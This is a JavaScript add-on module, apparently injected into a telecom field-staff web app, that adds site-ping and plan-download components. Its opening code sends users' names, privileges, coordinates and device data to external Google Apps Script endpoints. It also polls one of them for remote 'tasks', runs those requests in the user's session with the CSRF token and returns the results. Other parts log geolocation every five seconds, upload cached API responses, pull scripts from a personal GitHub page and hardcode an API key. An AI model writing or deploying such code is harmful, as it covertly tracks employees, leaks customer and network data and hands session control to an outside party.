
const FIX_test_version='FIX_test_24.03.23';
const FIX_test_app_version='FIX_test v1.6';
const FIX_test_DEV=!Boolean(window.AppInventor);
if(FIX_test_DEV){
  window.AppInventor={
    setWebViewString:function(str){console.log(str);this.str=str},
    getWebViewString:function(){return this.str},
    str:'',
  };
};
window.__defineGetter__('devVueTemplateMark',()=>`<tt style="position:absolute;font-size:10px;line-height:10px;color:#888888;">${new Date().toLocaleTimeString()} ${crypto.randomUUID()}</tt>`);
String.prototype.devVueTemplateMark=function(template=this){return template.match(/>/g)>2?template.replace('>','>'+window.devVueTemplateMark):`<div style="display:contents;">${window.devVueTemplateMark}${template}</div>`};

function createScriptCrcElement(id='',src=''){
  document.getElementById(id)?.remove();
  document.body.insertAdjacentElement('afterBegin',Object.assign(document.createElement('script'),{src,id}));
};
function createStyleElement(id='',css=''){
  document.getElementById(id)?.remove();
  const el=Object.assign(document.createElement('style'),{type:'text/css',id});
  el.appendChild(document.createTextNode(css));
  document.body.insertAdjacentElement('afterBegin',el);
};
createStyleElement('fix-test-app-css',`
  .text-decoration-line-through{text-decoration:line-through !important;}
  .padding-unset{padding:unset !important;}
  .ports-map__grid--gap-4px{gap:4px;}
`);


window.AppInventor.setWebViewString(`on:moduleOk:::=${FIX_test_version}`);
window.AppInventor.setWebViewString(`set:FollowLinks:::=false`);//костыль для 1.5.3
console.log(FIX_test_version,new Date().toLocaleString());
const info={
  ...filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']),
  visualViewport:filterProps(window.visualViewport,['width','height']),
  navigator:{
    ...filterProps(window.navigator,'vendor,vendorSub,productSub,buildID,platform,appName,appVersion,appCodeName,maxTouchPoints,hardwareConcurrency,standalone,product,userAgent,language,oscpu,deviceMemory'),
    connection:filterProps(window.navigator.connection,'effectiveType,rtt,downlink,saveData'),
  }
}
window.navigator.getBattery().then(battery=>{info.navigator.battery=filterProps(battery,'charging,chargingTime,dischargingTime,level')});

function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};

const node_id='n'+randcode(10);
let config_id='initial';
function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
function randUN(n=1){return randcode(n,'0123456789QAZWSXEDCRFVTGBYHNUJMIKOLP')}
let timeout_get=10000;
let enable_get=true;
let current_app_version='';
let username='';//app.$store.getters['main/userData']
fetch('/call/main/get_user_data').then(r=>r.json()).then(resp=>{
  if(resp?.data?.username){
    const {data:user_data={}}=resp;
    username=user_data.username;
    const {latitude,longitude,location,privileges}=user_data;
    fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{//inform on start
      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
      body:JSON.stringify({username,node_id,info,user_data,latitude,longitude,location,privileges,date:new Date(Date.now()).toString()})
    }).catch(console.warn).finally(()=>{
      let t=setTimeout(get,timeout_get);
      function get(){//get stat
        fetch(`https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username=${username}&node_id=${node_id}&config_id=${config_id}`).then(r=>r.json()).then(obj=>{
          const {config={},task={}}=obj;
          if(config){config_id=config?.config_id||config_id;timeout_get=config?.timeout||timeout_get;};
          const {task_id='',url='',method='',body={}}=task;
          if(task_id&&url&&method){
            fetch(url,((method==='POST')?Object.assign({method,headers:{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content')}},body?({body:JSON.stringify(body||{},null,2)}):{}):null)).then(r=>r.json()).then(response=>{
              if(response){
                fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},body:JSON.stringify({username,node_id,task:{task_id,response,isError:false}})}).then(r=>{next()}).catch(e=>{console.log(e);next()})
              }else{next()}
            }).catch(e=>{console.warn(e);next()})
          }else{next()}
        }).catch(e=>{console.warn(e);next()});
        function next(){if(enable_get){t=setTimeout(get,timeout_get)}};
      };
    });
    
    fetch(`https://script.google.com/macros/s/AKfycbxSwKUcTppHjUXcVxSyrx-CjyitTp8VUgBSQ0BOu3a2npDRKBRSDjLjnyIIwo69bXMq7A/exec?select_user_by_name=${username}`).then(r=>r.json()).then(user=>{
      const {appVersion='',userAgent=''}=user?.[username]||{};
      current_app_version=appVersion;
      if(current_app_version/*&&userAgent&&window.navigator.userAgent===userAgent*/){
        if(!document.getElementById('app_version_label')){
          document.body.insertAdjacentHTML('beforeend',`<div id="app_version_label" style="position:absolute;top:0;left:0;width:100%;white-space:pre;font-size:12px;${FIX_test_app_version!==current_app_version?'background:#00000022;':''}">${current_app_version} ${FIX_test_app_version!==current_app_version?'(требуется обновление!)':''}</div>`)
        }
      }
    })
    
  };
});

document.body.insertAdjacentHTML('beforeend',`<input type="button" id="btn_refresh" value="refresh" style="position:absolute;top:0;right:0;"/>`);
document.getElementById('btn_refresh')?.addEventListener('click',()=>{
  window.AppInventor.setWebViewString(`set:FollowLinks:::=true`);
  window.location.href='https://fx.mts.ru/fix';
});

//test inventory
/*if(store?.state?.main?.userData?.username=='mypanty1'){
  window.AppInventor.setWebViewString(`set:FollowLinks:::=true`)
};*/

async function httpGet(url,quiet){const response=await httpRequest('GET',url,null,quiet);pushResponse({url,response});return response};
const max_buffer_size=20;
const buffer=new Map();
function pushResponse({url,response}={}){
  buffer.set(url,response);
  if(FIX_test_DEV){console.log('buffer.size:',buffer.size)}
  if(buffer.size<max_buffer_size){return};
  const entries=[...buffer.entries()];
  const {location:region_id,username}=store?.state?.main?.userData||{};
  if(FIX_test_DEV){console.log('buffer.size==max_buffer_size:',region_id,username,entries)};
  if(region_id===54&&username&&!FIX_test_DEV){
    fetch('https://script.google.com/macros/s/AKfycbzV-IEHP2thb4wXGXPwmflsGwT8MJg-pGzXd1zCpekJ3b0Ecal6aTxJddtRXh_qVu0-/exec',{
      method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
      body:JSON.stringify({region_id,username,entries})
    })
  }
  buffer.clear()
};

//port refree
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortActionBindRefree.js',type:'text/javascript'}));

//activatespd
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortActionBindUserVgidActivate.js',type:'text/javascript'}));

document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/NetworkElement2EquipmentView.js',type:'text/javascript'}));

//portsmap logs indexing
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/PortsMapLogs.js',type:'text/javascript'}));

//user ip ping and go
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/DeviceActionPing.js',type:'text/javascript'}));

//rebind all abons by mac-port
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/DeviceActionPortsAbonsBinds.js',type:'text/javascript'}));

//redesign, fix params, need create custom table
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/Session.js',type:'text/javascript'}));

//kion pq
document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/SendKionPq.js',type:'text/javascript'}));

//cpe test 2
//document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://mypanty1.github.io/FX_test/AccountCpePage2.js',type:'text/javascript'}));



















let sendStateTimer=null;
let savePositionTimer=null;
const stateBuffer=new Set();

if(app?.$store?.getters?.['main/username']&&!FIX_test_DEV){
  saveUserStateToBuffer();
  getUserStateBufferAndSend();
  
  sendStateTimer=setInterval(()=>{
    getUserStateBufferAndSend();
  },300000);//5min
  
  savePositionTimer=setInterval(()=>{
    saveUserStateToBuffer();
  },5000);//5sec
};

async function saveUserStateToBuffer(){
  const date=new Date().toLocaleString();
  const time=Date.now();
  const getBattery=await window.navigator.getBattery();
  const {charging,chargingTime,dischargingTime,level}=getBattery||{};
  const battery=!getBattery?null:{charging,chargingTime,dischargingTime,level};
  const {effectiveType,rtt,downlink,downlinkMax,type}=window.navigator.connection||{};
  const connection={effectiveType,rtt,downlink,downlinkMax,type};
  if(window?.ymaps?.geolocation){
    console.info('geolocation by ymaps');
    window.ymaps.geolocation.get({}).then(result=>{
      let position=result?.geoObjects?.position;
      if(!position){
        getByNavigator({date,time,battery,connection});
        return
      };
      position=[...position];
      stateBuffer.add({date,time,position,battery,connection});
    });
  }else if('geolocation' in navigator){
    console.info('geolocation by navigator');
    getByNavigator({date,time,battery,connection});
  }else{
    console.info('no geolocation');
    stateBuffer.add({date,time,position:null,battery,connection});
  };
  
  function getByNavigator({date,time,battery,connection}){
    if('geolocation' in navigator&&'getCurrentPosition' in navigator.geolocation){
      navigator.geolocation.getCurrentPosition((result)=>{
        const {latitude,longitude}=result?.coords||{};
        if(!latitude||!longitude){
          stateBuffer.add({date,time,position:null,battery,connection})
          return
        };
        const position=[latitude,longitude];
        stateBuffer.add({date,time,position,battery,connection});
      });
    }else{;
      stateBuffer.add({date,time,position:null,battery,connection})
      return
    }
  }
};

async function getUserStateBufferAndSend(){
  const username=app?.$store?.getters?.['main/username'];
  if(!username){return};
  
  const region_id=app?.$store?.getters?.['main/region_id'];
  //const region=app?.$store?.getters?.['main/region'];
  const position_ldap={
    latitude:app?.$store?.getters?.['main/latitude'],
    longitude:app?.$store?.getters?.['main/longitude'],
  };
  
  const history=[...stateBuffer];
  const date=new Date().toLocaleString();
  const time=Date.now();
  const position=history[history.length-1]?.position||null;
  const getBattery=await window.navigator.getBattery();
  const {charging,chargingTime,dischargingTime,level}=getBattery||{};
  const battery=!getBattery?null:{charging,chargingTime,dischargingTime,level};
  const {effectiveType,rtt,downlink,downlinkMax,type}=window.navigator.connection||{};
  const connection={effectiveType,rtt,downlink,downlinkMax,type};
  
  const platform=window.navigator.platform;
  const {mobile,platform:_platform}=window.navigator.userAgentData||{};
  const userAgentData={mobile,platform:_platform};
  
  getUserStateAndSend({username,region_id,position_ldap,position,history,date,time,battery,connection,platform,userAgentData});
  stateBuffer.clear();
  
  function getUserStateAndSend({username,region_id,position_ldap,position,history,date,time,battery,connection,platform,userAgentData}){
    const sites=getSitesCache();//{}
    const tasks=getTasksCache();//[]
    
    getSitesToCacheIfNotPresent({tasks,sites});
    
    console.log({username,position,region_id,position_ldap,sites,tasks,history,date,time,battery,connection,platform,userAgentData});
    sendUserState({username,position,region_id,position_ldap,sites,tasks,history,date,time,battery,connection,platform,userAgentData});
  };
  
  function getTasksCache(){
    return [...app?.$store?.getters?.['wfm/wfmTasks']].reduce((tasks,task)=>{
      const {
        NumberOrder:task_id,
        siteid:site_id,
        AddressSiebel:address,
        Number_EIorNumberOrder:order,
        tasktype:type,
        status,
        OperationConcatenation:operationStr,
        Appointment:timeAppointment,
        Assignment:timeAssignment,
        TimeModified:dateModifed,
        LoginName:username,
        dateAssignment,
        clientNumber:account,
      }=task;
      const operations=operationStr?.split(',')||[];
      tasks[task_id]={
        task_id,site_id,username,
        account,address,order,
        type,status,operations,
        timeAppointment,
        timeAssignment,dateAssignment,
        dateModifed
      };
      return tasks
    },{})
  };

  function getSitesCache(){
    return Object.assign(Object.entries(localStorage).reduce((sites,[key,value])=>{
      if(!/^(building|buildings|get_nioss_object|getSite)/i.test(key)){return sites};
      let data=null;
      try{
        value=JSON.parse(value);
        if(value?.data){
          data=value?.data
        };
      }catch(error){
        return sites
      };
      
      if(!data){return sites};
      
      if(data?.site_id&&data?.latitude){//building by coords
        const {site_id,region_id,latitude,longitude}=data;
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude,region_id});
      }else if(data?.length&&data[0]?.coordinates){//buildings by coords
        for(const site of data){
          const {id:site_id,coordinates:{latitude,longitude}}=site;
          if(!sites[site_id]){sites[site_id]={site_id}};
          sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude});
        };
      }else if(data?.LatitudeWGS){//get_nioss_object by id
        const {resource_business_name:name,LatitudeWGS:latitude,LongitudeWGS:longitude}=data;
        const site_id=key.split('/')[1];
        const region_id=name?.split('_')[1];
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude:parseFloat(latitude),longitude:parseFloat(longitude),name,region_id:parseInt(region_id)});
      }else if(data?.id&&data?.coordinates){//getSite by pattern=id
        const {id:site_id,coordinates:{latitude,longitude},name,address}=data;
        if(!sites[site_id]){sites[site_id]={site_id}};
        sites[site_id]=Object.assign(sites[site_id],{site_id,latitude,longitude,name,address})
      };
      
      return sites;
    },{}),
      app.routerHistory.reduce((sites,route)=>{
      const site=route?.params?.siteProp
      if(site){
        const {id:site_id,coordinates:{latitude,longitude},name,address}=site;
        sites[site_id]={site_id,latitude,longitude,name,address}
      }
      return sites
    },{}));
  };
  
  function sendUserState(payload={}){
    try{
      fetch('https://script.google.com/macros/s/AKfycbzmM_kE0O7VjZcGijRPkmnwq3vsADjVdaKk9jOmtI7P4bcjwpGiVpzM7QLg1deraDtV-w/exec',{
        method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
        body:JSON.stringify({...payload,api_filter:'5x5'})
      });
    }catch(error){
      
    };
  };
  
  function getSitesToCacheIfNotPresent({tasks,sites}){
    const sites_ids=[...Object.values(tasks).reduce((ids,task)=>{
      const {site_id}=task;
      if(!sites[site_id]){
        ids.add(site_id)
      };
      return ids;
    },new Set())].forEach(site_id=>{
      getSiteAndSaveToCache(site_id);
    });
  };
  
  async function getSiteAndSaveToCache(site_id){
    if(!site_id){return};
    try{
      const response=await httpGet(buildUrl("search_ma",{pattern:site_id},"/call/v1/search/"));
      if(response.type==='error'){return};
      selectNodeDuAsSiteAndSave(site_id,response.data);
    }catch(error){
      
    };
    
    function selectNodeDuAsSiteAndSave(site_id,response_data){
      if(!response_data){return};
      if(!app?.$cache?.setItem){return};
      if(!site_id){return};
      if(Array.isArray(response_data)){
        app.$cache.setItem(`getSite/${site_id}`,response_data.find(({type})=>type.toUpperCase()==='ДУ')||response_data[0]);
      }else{
        app.$cache.setItem(`getSite/${site_id}`,response_data);
      }
    }
  };
};


























Vue.component('SiteExt',{
  template:`<div class="display-contents">
    <link-block :actionIcon="open_ext?'up':'down'" icon="card" text="дополнительно" type="large" @block-click="open_ext=!open_ext"/>
    <div v-show="open_ext" class="padding-left-right-16px">
      <SitePlanDownload v-bind="$props"/>
    </div>
    <devider-line />
    <template v-if="!entrance_id">
      <link-block :actionIcon="open_pings?'up':'down'" icon="factors" text="доступность" type="large" @block-click="open_pings=!open_pings">
        <div slot="postfix" class="display-flex align-items-center gap-4px">
          <span v-if="loadingSomePing" class="ic-20 ic-loading rotating tone-500"></span>
          <template v-else>
            <div v-if="countOfflineOrError" class="display-flex align-items-center gap-2px">
              <span class="font--13-500 tone-500">{{countOfflineOrError}}</span>
              <span class="ic-20 ic-warning main-orange"></span>
            </div>
            <div v-if="countOnline" class="display-flex align-items-center gap-2px">
              <span class="font--13-500 tone-500">{{countOnline}}</span>
              <span class="ic-20 ic-status main-green"></span>
            </div>
          </template>
        </div>
      </link-block>
      <div v-show="open_pings" class="padding-left-right-16px">
        <SitePings v-bind="{site,site_id}" @count-not-online="countOfflineOrError=$event" @count-online="countOnline=$event" @loading-some="loadingSomePing=$event"/>
      </div>
      <devider-line />
    </template>
  </div>`,
  props:{
    site:{type:Object,default:null,required:true},
    site_id:{type:String,default:'',required:true},
    entrances:{type:Array,default:()=>([]),required:true},
    entrance_id:{type:String,default:''},
  },
  data:()=>({
    open_ext:false,
    open_pings:false,
    countOfflineOrError:false,
    countOnline:false,
    loadingSomePing:false,
  }),
});

Vue.component('LedsBarChart',{//bar chart
  template:`<div class="display-flex flex-wrap gap-1px">
    <div v-for="(item,key) of Object.values(items)" :key="key" :style="getStyle(item)" :title="item?.title">{{item?.text||''}}</div>
  </div>`,
  props:{
    items:{type:[Object,Array],default:()=>[]},
    color:{type:String,default:'#5642bd'},
    width:{type:[String,Number],default:12},
    height:{type:[String,Number],default:3},
  },
  methods:{
    getStyle(item){
      return {
        width:(item?.width||this.width)+'px',
        height:(item?.height||this.height)+'px',
        borderRadius:'2px',
        background:item?.color||this.color,
        ...item?.style
      }
    }
  }
});

Vue.component('BtnSq',{//new btn
  template:`<button name="BtnSq" class="button-sq--medium" style="border-radius:4px;color:#5642bd;border:1px solid;cursor:pointer;display:flex;justify-content:center;" :style="{width:size+'px',minWidth:size+'px',height:size+'px'}" type="button" v-on="$listeners">    
    <slot><span :class="iconClass"></span></slot>    
  </button>`,
  props:{
    size:{type:String,default:'20'},
    iconSize:{type:String,default:'16'},//12,14,16,20,24,80
    icon:{type:String,default:'refresh'},
    loading:{type:Boolean,default:false},
  },
  computed:{//перенести классы всместо button-sq--medium
    iconClass(){
      return `ic-${ this.iconSize } ic-${this.loading?'loading rotating':this.icon}`
    },
  },
});

Vue.component('SitePings',{//pings chart
  template:`<div name="SitePings">
    <div class="display-grid row-gap-2px col-gap-4px" style="grid-template-columns:repeat(2,max-content) 1fr">
      
      <template v-if="networkElementsCount">
        <BtnSq :loading="loadingSome" @click="pingAll" :disabled="running"/>
        <div class="display-flex gap-4px" style="grid-column: span 2">
          <button-main @click="clear" label="clear" buttonStyle="outlined" size="medium" class="width-50px height-20px border-radius-4px"/>
          <button-main @click="start" label="start" :loading="running" :disabled="running" buttonStyle="contained" size="medium" class="width-50px height-20px border-radius-4px"/>
          <button-main @click="stop" label="stop" buttonStyle="outlined" size="medium" class="width-50px height-20px border-radius-4px"/>
          <div class="font--13-500 tone-500">{{count||''}}</div>
        </div>
      </template>
      
      <template v-for="({ip,mr_id,modelText}) in networkElementsFiltered">
        <PingLed :key="ip" v-bind="{ip,mr_id}" noPingOnCreatedddd ref="PingLeds" @on-result="onResult(ip,$event)" @loading="$set(loads,ip,$event)"/>
        <div class="font--13-500">{{ip}}</div>
        <div class="font--13-500 tone-500">{{modelText}}</div>
        
        <div></div>
        <LedsBarChart class="position-relative" style="grid-column: span 2;bottom:7px;" :items="results[ip]"/>
      </template>
      
    </div>
  </div>`,
  props:{
    site:{type:Object,default:null,required:true},
    site_id:{type:String,default:'',required:true}
  },
  data:()=>({
    loads:{},
    results:{},
    timer:null,
    timeout:1000,
    max_count:100,
    count:0,
    running:false,
    states:{},
  }),
  created(){
    const {site_id}=this;
    this.getSiteNetworkElements({site_id});
  },
  watch:{
    'countNotOnline'(countNotOnline){
      this.$emit('count-not-online',countNotOnline);
    },
    'countOnline'(countOnline){
      this.$emit('count-online',countOnline);
    },
    'loadingSome'(loadingSome){
      this.$emit('loading-some',loadingSome);
    },
		'networkElementsDuESwInstalled54'(networkElements){
			if(!Object.values(networkElements).length){return};
			const subscribes=Object.values(networkElements).map(({ip})=>{
				return fetch(`https://ping54.ru/addDeviceSnmpTrapsUserSubscription?ip=${ip}`,{
					headers:{
						'user-key':'LFjoMC6x-bWQlVyX3-FFPZGwvf-lOo5rT2o-uuubGsRh-eOdFpD4Y'
					}
				});
			});
			Promise.allSettled(subscribes)
		},
  },
  computed:{
    node_id(){return this.site.node_id},
    ...mapGetters({
      getNetworkElementsBySiteId:'site/getNetworkElementsBySiteId',
    }),
    networkElements(){return this.getNetworkElementsBySiteId(this.site_id)},
    networkElementsFiltered(){
      return select(this.networkElements,{
        site_id:this.site_id,
        node_id:this.node_id,
        ip:(ip)=>!!ip,
        sysObjectID:(sysObjectID,item)=>{
          const {vendor,model}=item;
          item.modelText=getModelText(vendor,model,sysObjectID);
          return true
        },
      }) 
    },
		networkElementsDuESwInstalled54(){
			return select(this.networkElements,{
				region_id:54,
				ne_name:testByName.neIsETH,
        node_name:testByName.nodeIsDu,
        ne_status:testByName.neIsInstalled,
        site_id:this.site_id,
        node_id:this.node_id,
        ip:(ip)=>!!ip,
        sysObjectID:(sysObjectID)=>!!sysObjectID,
      })
		},
    networkElementsCount(){return Object.values(this.networkElementsFiltered).length},
    loadingSome(){
      return Object.values(this.loads).some(v=>v)
    },
    countNotOnline(){
      return Object.values(this.states).filter(v=>v!=='online').length
    },
    countOnline(){
      return Object.values(this.states).filter(v=>v==='online').length
    }
  },
  methods:{
    ...mapActions({
      getSiteNetworkElements:'site/getSiteNetworkElements',
    }),
    async pingAll(){
      const pings=(this.$refs.PingLeds||[]).map(led=>led.ping());
      return await Promise.allSettled(pings);
    },
    clear(){
      this.stop();
      this.results={};
      this.max_count=100;
      this.count=0;
    },
    start(){
      if(this.running){return};
      this.running=true;
      this.next();
    },
    next(){
      this.timer=setTimeout(async ()=>{
        this.max_count--;
        this.count++;
        await this.pingAll();
        if(this.max_count<=0){
          this.stop();
        }else if(this.running){
          this.next();
        }
      },this.timeout);
    },
    stop(){
      this.running=false;
      clearTimeout(this.timer);
    },
    onResult(ip,result){
      if(!ip||!result){return};
      this.$set(this.states,ip,result.state);
      if(this.running){
        this.storeResult(ip,result);
      }
    },
    storeResult(ip,result){
      if(!this.results[ip]){this.$set(this.results,ip,{})};
      const {state,ms,date}=result;
      const item={
        color:state==='online'?'#20a471':state==='offline'?'#e44656':state==='error'?'#f16b16':'#918f8f',
      };
      if(state==='online'){
        //item.width=ms*12,
        item.title=ms
      };
      this.$set(this.results[ip],date,item);
    }
  },
});


Vue.component('SitePlanDownload',{//плансхема
  template:`<div name="SitePlanDownload">
    <div class="display-flex align-items-center gap-4px justify-content-flex-end">
      <span id="loader_generatePL" class="spd-loader" style="display:none;"></span>
      <input type="button" id="btn_generatePL" disabled @click="createSchematicPlan(site_id)" style="font-family:arial;font-size:8pt;padding:1px;opacity:1;" value="план-схема">
      <input type="button" id="btn_generatePL_woTS" @click="createSchematicPlan(site_id,true)" style="font-family:arial;font-size:8pt;padding:1px;opacity:1;" value="план-схема без ТС">
    </div>
  </div>`,
  props:{
    site:{type:Object,default:null,required:true},
    site_id:{type:String,default:'',required:true},
    entrances:{type:Array,default:()=>([]),required:true},
    entrance_id:{type:String,default:''},
  },
  data:()=>({
    openOptions:false,
  }),
  mounted(){
    createStyleElement('SitePlanDownload-css',`
    .spd-loader{width:18px;height:18px;border:2px dashed cadetblue;border-left-color:crimson;border-right-color:coral;border-top-color:cornflowerblue;border-radius:50%;animation:spd-loader-spinner 0.99s linear infinite;}
    @keyframes spd-loader-spinner{to{transform:rotate(360deg)}}
    `)
  },
  computed:{},
  methods:{
    async getSite(site_id,hideTS=false){
      console.log('getSite('+site_id+','+hideTS+')');
      const result={
        [site_id]:{
          nodes:[],
          _sites:{},
          _nodes:{},
          entrances:{},
          racks:{},
          devices:{},
          unmount_devices:{},
          ppanels:{},
        },
      };
      const gets=[];
      const dict={};

      return Promise.allSettled([
        this.$cache.getItem(`building/${site_id}`)?Promise.resolve(this.$cache.getItem(`building/${site_id}`)):httpGet(buildUrl('search_ma',{pattern:site_id},'/call/v1/search/')),
        this.$cache.getItem(`site_flat_list/${site_id}`)?Promise.resolve(this.$cache.getItem(`site_flat_list/${site_id}`)):httpGet(buildUrl('site_flat_list',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`devices/${site_id}`)?Promise.resolve(this.$cache.getItem(`devices/${site_id}`)):httpGet(buildUrl('devices',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`get_unmount_devices/${site_id}`)?Promise.resolve(this.$cache.getItem(`get_unmount_devices/${site_id}`)):httpGet(buildUrl('get_unmount_devices',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`site_rack_list/${site_id}`)?Promise.resolve(this.$cache.getItem(`site_rack_list/${site_id}`)):httpGet(buildUrl('site_rack_list',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`patch_panels/${site_id}`)?Promise.resolve(this.$cache.getItem(`patch_panels/${site_id}`)):httpGet(buildUrl('patch_panels',{site_id,without_tree:true},'/call/v1/device/')),
      ]).then((responses)=>{
        const results=[];
        for(const response of responses){
          results.push(response.status==='fulfilled'?(response.value.length?response.value:[response.value]):[]);
        };
        return {
          nodes:results[0],
          entrances:results[1],
          devices:results[2],
          unmount_devices:results[3],
          racks:results[4],
          ppanels:results[5],
        };
      }).then(results=>{
        for(const name in results){
          switch(name){
            case 'nodes':
              result[site_id].nodes=results[name].length?(results[name][0].type!=='building_list'?[results[name][0].data]:results[name][0].data):[];

              gets.push(httpGet(buildUrl('get_nioss_object',{object_id:site_id,object:'site'},'/call/nioss/')));
              dict[gets.length-1]='_sites/'+site_id+'/nioss';

              for(const node of result[site_id].nodes){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:node.uzel_id,object:'node'},'/call/nioss/')));
                dict[gets.length-1]='_nodes/'+node.uzel_id+'/nioss';
              };
            break;
            case 'entrances':
              for(const entrance of results[name].filter(item=>!item.nioss_error)){
                if(hideTS){
                  entrance.floor=entrance.floor.map(floor=>{
                    floor.flats=floor.flats.map(flat=>{
                      flat.subscribers=flat.subscribers.map(subscriber=>{
                        subscriber.account='x-xxx-xxxxxxx';
                        subscriber.services=subscriber.services.map(service=>{
                          service.msisdn='7xxxxxxxxxx';
                          return service;
                        });
                        return subscriber;
                      });
                      flat.services=flat.services.map(service=>{
                        service.msisdn='7xxxxxxxxxx';
                        return service;
                      });
                      return flat;
                    });
                    return floor;
                  });
                };
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:entrance.id,object:'entrance'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+entrance.id+'/nioss';

                result[site_id][name][entrance.id]=entrance;
              };
            break;
            case 'devices':
              for(const device of results[name]){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:device.nioss_id,object:'device'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+device.nioss_id+'/nioss';

                if(['ETH','OP','CPE','FAMP','SBE','FTRM','IP','MPLS','OLT','MBH'].includes(device.name.split('_')[0].split('-')[0])){
                  gets.push(httpGet(buildUrl('search_ma',{pattern:device.name},'/call/v1/search/')));
                  dict[gets.length-1]=name+'/'+device.nioss_id;
                };

                gets.push(httpGet(buildUrl('get_dismantled_devices',{device_name:device.name},'/call/v1/device/')));
                dict[gets.length-1]=name+'/'+device.nioss_id+'/devices';

                if(['ETH','MPLS','MBH','OLT'].includes(device.name.split('_')[0].split('-')[0])){
                  if(!hideTS){
                    gets.push(httpGet(buildUrl('device_port_list',{device:device.name},'/call/device/')));
                    dict[gets.length-1]=name+'/'+device.nioss_id+'/ports';
                    /*
                    gets.push(httpGet(buildUrl('get_history_conn_point_list',{device_id:643651,region_id:54},'/call/v1/device/')));
                    dict[gets.length-1]=name+'/'+device.nioss_id+'/conn_point_list';
                    */
                  };
                };

                result[site_id][name][device.nioss_id]=device;
              };
            break;
            case 'unmount_devices':
              for(const device of results[name]){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:device.device_nioss_id,object:'device'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+device.device_nioss_id+'/nioss';

                result[site_id][name][device.device_nioss_id]={
                  site_id:device.site_id,
                  uzel:{id:device.uzel_id,name:device.uzel_name},
                  nioss_id:device.device_nioss_id,
                  name:device.device_name,
                  ip:device.ip_address,
                  display:device.display_name,
                  ne_status:device.ne_status,
                  snmp:{version:device.snmp_version,community:device.snmp_community},
                  region:results['devices'][0]?.region||{code:"",id:0,location:"",mr_id:0,name:""},
                  access_mode:null,
                  description:"",
                  discovery:{date:"",type:"",status:"",text:""},
                  firmware:"",
                  firmware_revision:null,
                  model:"",
                  system_object_id:"",
                  type:"",
                  upstream_ne:"",
                  vendor:"",
                };
              };
            break;
            case 'racks':
              for(const rack of results[name].filter(item=>!item.nioss_error)){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:rack.id,object:'rack'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+rack.id+'/nioss';

                result[site_id][name][rack.id]=rack;
              };
            break;
            case 'ppanels':
              for(const pp of results[name].filter(item=>!item.nioss_error)){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:pp.id,object:'plint'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+pp.id+'/nioss';

                result[site_id][name][pp.id]=pp;
              };
            break;
            default:break;
          };
        };
        return Promise.allSettled(gets);
      }).then(responses=>{
        responses.map((response,index)=>{
          const value=response.status==='fulfilled'?response.value:{};
          const path=dict[index].split('/');
          result[site_id][path[0]][path[1]]={
            ...result[site_id][path[0]][path[1]],
            ...path.length>2?{[path[2]]:value}:value,
          };
        });
        return result;
      });
    },
    async createSchematicPlan(site_id,hideTS=true){
      //document.getElementById('btn_generatePL').setAttribute('disabled','disabled');
      document.getElementById('btn_generatePL_woTS').setAttribute('disabled','disabled');
      document.getElementById('loader_generatePL').style.display='inline-table';

      const siteObj=await this.getSite(site_id,hideTS);
      const user=this.$root.username||'<username>';
      const site_name=siteObj[site_id].nodes[0].name;
      const address=siteObj[site_id].nodes[0].address;
      const date=new Date();
      const title=site_name+' '+date.toLocaleDateString().match(/(\d|\w){1,4}/g).join('.')+' '+date.toLocaleTimeString().match(/(\d|\w){1,4}/g).join('-')+' '+date.getTime().toString(16)+' '+user;
      const bodyObj={
        username:user,
        node_id,
        sitename:site_name,site_name,
        address,
        siteid:site_id,site_id,
        title,
        json:JSON.stringify(siteObj,null,2),
